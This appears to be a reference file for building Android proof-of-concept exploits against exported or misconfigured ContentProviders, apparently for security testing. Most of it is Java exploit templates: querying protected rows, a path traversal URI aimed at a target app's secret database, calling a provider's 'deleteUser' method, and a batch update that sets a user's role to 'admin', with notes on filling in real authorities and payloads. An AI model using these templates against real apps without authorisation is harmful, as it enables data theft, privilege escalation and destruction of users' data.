---
name: poc-app-provider
description: Provider PoC reference covering data exposure, SQL injection, path traversal, custom call methods, batch abuse, getType oracles, and FileProvider misconfiguration.
---

# Provider PoC Reference

Use this reference for exported or grant-reachable `ContentProvider` attack paths. Provider PoCs usually fit the `direct-trigger` shape, with `returned-handle` used for grant-based FileProvider chains.

## Contents

- [Template Wiring](#template-wiring)
- [Construction Matrix](#construction-matrix)
- [Shared Inputs](#shared-inputs)
- [Pattern 1 - Query-Based Read Or Injection](#pattern-1---query-based-read-or-injection)
- [Pattern 2 - File Or Path Access](#pattern-2---file-or-path-access)
- [Pattern 3 - Custom `call()` Or Batch Abuse](#pattern-3---custom-call-or-batch-abuse)
- [Pattern 4 - Oracle Or Grant-Oriented Validation](#pattern-4---oracle-or-grant-oriented-validation)
- [Construction Notes](#construction-notes)

## Template Wiring

These snippets show the exploit body shape. In the current template:

- keep provider access in a small helper method
- register one exploit id per provider path in `ExploitRegistry`
- add support components only when a grant or interception step truly needs them

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| data leak | `direct-trigger` | none | protected rows become readable |
| SQL injection | `direct-trigger` | none | query semantics change and protected data is returned |
| path traversal | `direct-trigger` | none | attacker-controlled path is accepted by file APIs |
| `call()` exposure | `direct-trigger` | none | custom method executes or returns sensitive data |
| batch abuse | `direct-trigger` | none | unauthorized insert, update, or delete succeeds |
| `getType()` oracle | probe-only `direct-trigger` | none | existence or state leak is observed |
| FileProvider misconfig | `returned-handle` or `direct-trigger` | none | private file URI becomes readable |

## Shared Inputs

- victim provider authority and path
- attacker-controlled query args, URI segments, method name, or batch body
- whether the path is direct-open or grant-reuse
- visible success signal

## Pattern 1 - Query-Based Read Or Injection

Use for data leaks and many SQL injection cases.

```java
private static void runProviderQueryLeak(Context context) {
    Uri uri = Uri.parse("content://com.target.provider/users");
    try (Cursor cursor = context.getContentResolver().query(uri, null, null, null, null)) {
        if (cursor != null) {
            Log.i("PoC", "Returned rows: " + cursor.getCount());
        } else {
            Log.i("PoC", "Query returned null cursor");
        }
    } catch (Exception e) {
        Log.e("PoC", "Query failed", e);
    }
}
```

Registration shape:

```java
static {
    register("provider-query", "Query Exported Provider", () -> runProviderQueryLeak(appContext));
}
```

SQL injection variant:

- replace `selection`, `selectionArgs`, or `sortOrder` with the verified attacker-controlled injection point

Fill with:

- real `content://` authority and path
- exact projection, selection, selection args, or sort clause that proves the finding

## Pattern 2 - File Or Path Access

Use for traversal and many FileProvider cases.

```java
private static void runProviderPathTraversal(Context context) {
    Uri uri = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db");
    try (ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r")) {
        if (pfd != null) {
            Log.i("PoC", "openFileDescriptor() accepted traversal URI");
        } else {
            Log.i("PoC", "File descriptor was null");
        }
    } catch (Exception e) {
        Log.e("PoC", "openFileDescriptor() failed", e);
    }
}
```

Registration shape:

```java
static {
    register("provider-file", "Open Provider File Path", () -> runProviderPathTraversal(appContext));
}
```

Use when:

- attacker-controlled URI segments flow into `openFile()` or equivalent file APIs

## Pattern 3 - Custom `call()` Or Batch Abuse

Use for custom method exposure or unauthorized writes.

```java
private static void runProviderCallExpose(Context context) {
    Uri uri = Uri.parse("content://com.target.provider");
    Bundle extras = new Bundle();
    extras.putString("user_id", "1");
    try {
        Bundle result = context.getContentResolver().call(uri, "deleteUser", null, extras);
        Log.i("PoC", "call() returned: " + result);
    } catch (Exception e) {
        Log.e("PoC", "call() failed", e);
    }
}
```

```java
private static void runProviderBatchAbuse(Context context) {
    Uri uri = Uri.parse("content://com.target.provider/users");
    ArrayList<ContentProviderOperation> operations = new ArrayList<>();
    ContentValues values = new ContentValues();
    values.put("role", "admin");
    operations.add(ContentProviderOperation.newUpdate(uri)
        .withSelection("user_id=?", new String[]{"10001"})
        .withValues(values)
        .build());

    try {
        ContentProviderResult[] results = context.getContentResolver()
            .applyBatch("com.target.provider", operations);
        Log.i("PoC", "applyBatch() result count: " + results.length);
    } catch (Exception e) {
        Log.e("PoC", "applyBatch() failed", e);
    }
}
```

Registration shape:

```java
static {
    register("provider-call", "Invoke Provider call()", () -> runProviderCallExpose(appContext));
    register("provider-batch", "Apply Provider Batch", () -> runProviderBatchAbuse(appContext));
}
```

Fill with:

- real `call()` method name and extras
- real authority string for `applyBatch(...)`
- exact row selector and write payload that proves unauthorized mutation

## Pattern 4 - Oracle Or Grant-Oriented Validation

Use for `getType()` probes or FileProvider grant reuse.

Construction rules:

- `getType()` is usually a supporting probe, not the primary PoC
- FileProvider paths may be demonstrated either by directly opening the misconfigured URI or by reusing a returned grant-bearing URI

Success signal:

- distinguishable `getType()` result
- actual readable file content or accepted file descriptor

## Construction Notes

- prefer one direct query or file-open helper when the bug is already visible without a multi-step grant chain
- keep grant reuse explicit when the PoC depends on a returned `content://` handle
- `getType()` is usually a confirmation probe, not the main exploit body
